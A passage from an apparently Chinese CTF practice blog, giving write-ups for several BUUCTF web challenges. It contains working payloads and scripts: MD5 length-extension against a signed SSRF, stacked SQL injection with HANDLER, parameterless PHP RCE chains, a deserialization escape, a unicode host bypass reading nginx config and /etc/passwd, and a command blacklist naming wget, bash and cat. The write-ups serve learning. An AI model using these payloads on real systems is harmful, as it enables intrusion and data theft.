json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>在<code>/De1ta</code>路由下</p>
<p>第一关要绕过waf，不能用 <code>gopher</code>和<code>file</code>协议，但urllib模块支持 <code>local_file</code>协议，而且题目告诉<code>flag</code>在 <code>./flag.txt</code>。</p>
<p>一般情况下,<code>local_file:flag.txt</code>是相对路径，<code>local_file:///flag.txt</code>则是绝对路径。</p>
<p>第二关则要绕md5校验</p>
<p>关键在<code>getSign(self.action, self.param) == self.sign</code>，而<code>getSign()</code> 相当于<code>md5(secert_key + param + action)</code> ，<code>secert_key</code>是脚本随机生成的16位字符串。</p>
<p>在<code>/geneSign</code>路由下提交<code>param=local_file:flag.txt</code>得到<code>md5(secert_key + local_file:flag.txt + scan)</code>既<code>fefdccdd74fd9e221ea27ca5458d45c7</code></p>
<p>然后使用 <code>hashpump</code>构造字符串</p>
<p><img src="/2020/08/8月刷题记录/image-20200809223529285.png" alt="image-20200809223529285"></p>
<p><img src="/2020/08/8月刷题记录/image-20200809223624980.png" alt="image-20200809223624980"></p>
<p>因为 <code>param(local_file:flag)</code> 会在服务端拼接，所以<code>action</code>删除要<code>local_file:flag</code>字段</p>
<p>@一叶飘零师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'local_file:///proc/self/cwd/flag.txt'</span></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://a07ad6bf-0c49-4483-8f5f-9b268185cc87.node3.buuoj.cn/geneSign?param='</span>+url)</span><br><span class="line">old_sign = r.content</span><br><span class="line">new_sign = hashpumpy.hashpump(old_sign, url + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">'sign'</span>: new_sign[<span class="number">0</span>],</span><br><span class="line"><span class="string">'action'</span>: urllib.quote(new_sign[<span class="number">1</span>][len(url):])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://a07ad6bf-0c49-4483-8f5f-9b268185cc87.node3.buuoj.cn/De1ta?param='</span>+url, cookies=cookies)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure>

<h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>堆叠注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">1'; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> FlagHere; <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>flag就在表<code>FlagHere</code>中</p>
<p>过滤如下：</p>
<p><code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
<p>set被禁，不能用进制绕过</p>
<p>利用handler绕过，payload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1'; <span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>啥也没有，最后扫目录</p>
<p><img src="/2020/08/8月刷题记录/image-20200809235401850.png" alt="image-20200809235401850"></p>
<p>githack还原文件</p>
<p><img src="/2020/08/8月刷题记录/image-20200810000328848.png" alt="image-20200810000328848"></p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>无参RCE</p>
<p><code>et</code>被禁 <code>getenv()</code> <code>getallheaders()</code>  <code>get_defined_vars()</code> 都用不了</p>
<p>读取文件，不能使用<code>file_get_contents()</code>，但是可以可以使用<code>readfile()</code>或<code>highlight_file()</code>以及其别名函数<code>show_source()</code></p>
<p>这里使用 session_id()</p>
<p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。</p>
<p>其他payload</p>
<p><code>exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p>
<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></p>
<p>current() 返回数组中的当前单元, 默认取第一个值。pos() 是current() 的别名。</p>
<p>array_reverse() 以相反的元素顺序返回数组</p>
<p><img src="/2020/08/8月刷题记录/image-20200810002921599.png" alt="image-20200810002921599"></p>
<p><code>highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code> //多刷新几次</p>
<p>array_flip()交换数组的键和值</p>
<p>array_rand()从数组中随机取出一个或多个单元</p>
<h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p>SQL注入，抓包，页面源码都没有有用的信息，后面扫目录拿到源码</p>
<p>其中config.php有$flag变量，所以应该是读取服务端 config.php文件。</p>
<p>根据update.php <code>$profile[&#39;nickname&#39;]</code>变量通过传参数组可以绕过<code>die()</code>，从而可控<code>nickname</code></p>
<p>接着是反序列化 <code>$profile</code> </p>
<p><code>$user-&gt;update_profile($username, serialize($profile));</code></p>
<p>反序列化的字符串可控，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PHP序列化长度变化导致字符逃逸</span></span><br><span class="line"><span class="comment">//PHP反序列化中值的字符读取多少其实是由表示长度的数字控制的，而且只要整个字符串的前一部分能够成功反序列化，这个字符串后面剩下的一部分将会被丢弃</span></span><br><span class="line">$s = <span class="string">"Hello World"</span>;</span><br><span class="line">$a = <span class="keyword">array</span>($s);</span><br><span class="line">var_dump(serialize($a)); <span class="comment">//string(29) "a:1:&#123;i:0;s:11:"Hello World";&#125;"</span></span><br><span class="line">$fake = <span class="string">'a:1:&#123;i:0;s:7:"Hello "";&#125;World";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($fake)); <span class="comment">//string(7) "Hello ""</span></span><br><span class="line"><span class="comment">//我们可以看到，原来的字符串"Hello World"内 "World"改成了一个双引号，s:11 改成 s:7 再是正常结尾时需要有的 ";&#125; 三个字符</span></span><br><span class="line"><span class="comment">//在PHP进行反序列化时，由字符串初始位置向后读取7个字符，即使遇到字符串分解符单双引号也会继续向下读，而后遇到了正常的结束符，达成了正常反序列化的条件，反序列化结束，</span></span><br><span class="line"><span class="comment">//后面的 World";&#125;  几个字符均被丢弃。</span></span><br></pre></td></tr></table></figure>

<p>虽然<code>$profile[&#39;nickname&#39;]</code>可控，但序列化是在服务器端，<code>s</code>的长度无法控制，也就无法逃逸</p>
<p>慢慢看源码</p>
<p>接着在<code>profile.php</code>调用了</p>
<p><code>$profile=$user-&gt;show_profile($username);</code></p>
<p>这个<code>show_proflie()</code>具体如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">    $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">    $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line">    $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意<code>filter()</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span>//<span class="title">class</span>.<span class="title">php</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); <span class="comment">// ' 和 \\ 字符</span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; <span class="comment">// "/'|\\/"</span></span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//  ' 和 \\ 替换成 _</span></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>; <span class="comment">// "/select|insert|update|delete|where/i"</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//同理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 <code>$profile</code>存入数据库未被过滤，取出数据库时却被过滤了</p>
<p>而如果将<code>where</code>替换成 <code>hacker</code> 例如</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"where"</span> &gt;&gt; <span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"hacker"</span>&gt;&gt;反序列化 <span class="selector-tag">hacke</span>，<span class="selector-tag">r</span>则可以按我们的意愿修改，这样在不修改<span class="selector-tag">s</span>的情况下，控制了反序列化</span><br></pre></td></tr></table></figure>

<p>接下来的插入数据其实和SQL注入很像，利用 <code>&quot;;}</code>闭合前一部分，接着注入数据</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"66666666666"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"test@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>:&#123;<span class="built_in">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"here"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">39</span>:<span class="string">"upload/098f6bcd4621d373cade4e832627b4f6"</span>;&#125;'</span><br><span class="line">在here后面闭合即</span><br><span class="line">&#123;<span class="built_in">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"here"</span>;&#125;                                                           <span class="string">"&#125;</span></span><br><span class="line"><span class="string">插入数据</span></span><br><span class="line"><span class="string">&#123;i:0;s:4:"</span>here<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;                            "</span>&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们要插入 <code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34，即我们需要34个where</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phone=<span class="string">"66666666666"</span>;</span><br><span class="line">$email = <span class="string">"test@qq.com"</span>;</span><br><span class="line">$nickname=<span class="keyword">array</span>(<span class="string">'wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125;'</span>);</span><br><span class="line">$file = <span class="keyword">array</span>(<span class="string">"size"</span>=&gt;<span class="string">"10"</span>,<span class="string">"name"</span>=&gt;<span class="string">"test"</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $phone))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $email))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $nickname) || strlen($nickname) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$profile[<span class="string">'phone'</span>] = $phone;</span><br><span class="line">$profile[<span class="string">'email'</span>] = $email;</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $nickname;</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line">var_dump(serialize($profile));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$profile = <span class="string">'a:4:&#123;s:5:"phone";s:11:"66666666666";s:5:"email";s:11:"test@qq.com";s:8:"nickname";a:1:&#123;i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125;";&#125;s:5:"photo";s:39:"upload/098f6bcd4621d373cade4e832627b4f6";&#125;'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span>//<span class="title">class</span>.<span class="title">php</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); <span class="comment">// ' 和 \\ 字符</span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; <span class="comment">// "/'|\\/"</span></span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//  ' 和 \\ 替换成 _</span></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>; <span class="comment">// "/select|insert|update|delete|where/i"</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//同理</span></span><br><span class="line">true&#125;</span><br><span class="line">$profile = filter($profile);</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line">var_dump($profile[<span class="string">'photo'</span>]);</span><br><span class="line">var_dump($photo);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8月刷题记录/image-20200810140642188.png" alt="image-20200810140642188"></p>
<h3 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h3><p><code>blackhat</code>议题之一<code>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</code></p>
<p><img src="/2020/08/8月刷题记录/1828215-20200113142549010-1977431520.png" alt="1828215-20200113142549010-1977431520"></p>
<p>根据源码写爆破脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunsplit, urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65535</span>):</span><br><span class="line">        uni = chr(x)</span><br><span class="line">        url = <span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line"></span><br><span class="line">                print(parse.quote(chr(x))+<span class="string">" str: "</span> + uni + <span class="string">' unicode: \\u'</span> + str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>

<p>题目提示我们是nginx，所以我们去读取nginx的配置文件</p>
<p>这里读的路径是 /usr/local/nginx/conf/nginx.conf</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">94</span>cc5e34-bb0b-<span class="number">44</span>bb-b029-ca087a23f0b6.node3.buuoj.cn<span class="regexp">/getUrl?url=file:/</span><span class="regexp">/suctf.c%E2%84%82/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">//u</span>sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure>

<p>然后读flag就行</p>
<p>另外一种<a href="https://xz.aliyun.com/t/6281" target="_blank" rel="noopener">思路</a>是突破<code>urlunsplit</code> </p>
<p>函数定义在 <code>urllib\parse.py</code> 中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlunsplit</span><span class="params">(components)</span>:</span></span><br><span class="line">    scheme, netloc, url, query, fragment, _coerce_result = (</span><br><span class="line">                                          _coerce_args(*components))</span><br><span class="line">    <span class="keyword">if</span> netloc <span class="keyword">or</span> (scheme <span class="keyword">and</span> scheme <span class="keyword">in</span> uses_netloc <span class="keyword">and</span> url[:<span class="number">2</span>] != <span class="string">'//'</span>):</span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">and</span> url[:<span class="number">1</span>] != <span class="string">'/'</span>: url = <span class="string">'/'</span> + url</span><br><span class="line">        url = <span class="string">'//'</span> + (netloc <span class="keyword">or</span> <span class="string">''</span>) + url</span><br><span class="line">    <span class="keyword">if</span> scheme:</span><br><span class="line">        url = scheme + <span class="string">':'</span> + url</span><br><span class="line">    <span class="keyword">if</span> query:</span><br><span class="line">        url = url + <span class="string">'?'</span> + query</span><br><span class="line">    <span class="keyword">if</span> fragment:</span><br><span class="line">        url = url + <span class="string">'#'</span> + fragment</span><br><span class="line">    <span class="keyword">return</span> _coerce_result(url)</span><br></pre></td></tr></table></figure>

<p>从题目源码也可以看出，这个函数的用法大概就是把 <code>url</code> 各个部分组成 <code>list</code> 传进来。</p>
<p>我们来分析一下这个函数：</p>
<p>这里的 <code>netloc</code> 就是题目中拿来判断的 <code>host</code>。</p>
<p>首先第一个 <code>if</code> 判断了 <code>netloc</code> 是否为空，如果不是空就进入代码块，第二个是判断 <code>schema</code> 是否为空。第三个第四个就不分析了。</p>
<p>仔细看看第二个 <code>if</code>，这里并没有强制要求 <code>netloc</code> 要有东西，假设一下我们传入一个这样的 <code>url</code>：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">//</span>abc</span><br></pre></td></tr></table></figure>

<p>这个 <code>url</code> 传入入 <code>parse.urlparse</code> 时，<code>netloc</code> 是为空的，而 <code>path</code> 为 <code>//abc</code>，当进入到 <code>urlunsplit</code> 后，<code>netloc</code> 为空不进入第一块代码，<code>schema</code> 为 <code>file</code>，进入第二个代码块，拼接后 <code>url</code> 就变成了：<code>file://abc</code></p>
<p>所以构造<code>file:////suctf.cc/../../../../../etc/passwd</code></p>
<p>贴下其他nginx配置文件</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">主配置文件：<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">管理脚本：<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">模块：<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">应用程序：<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">程序默认存放位置：<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">日志默认存放位置：<span class="meta-keyword">/var/</span>log/nginx</span><br></pre></td></tr></table></figure>

<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>url明显有有问题</p>
<p><code>img=TXpVek5UTTFNbVUzTURabE5qYz</code> =&gt; base64 =&gt;base64 =&gt; hex =&gt; 555.png</p>
<p>反过去 加密 <code>index.php</code>下载源码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!isset($_GET[<span class="string">'img'</span>]) || !isset($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    echo <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    die(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    echo(<span class="string">"forbid ~"</span>);</span><br><span class="line">    echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span 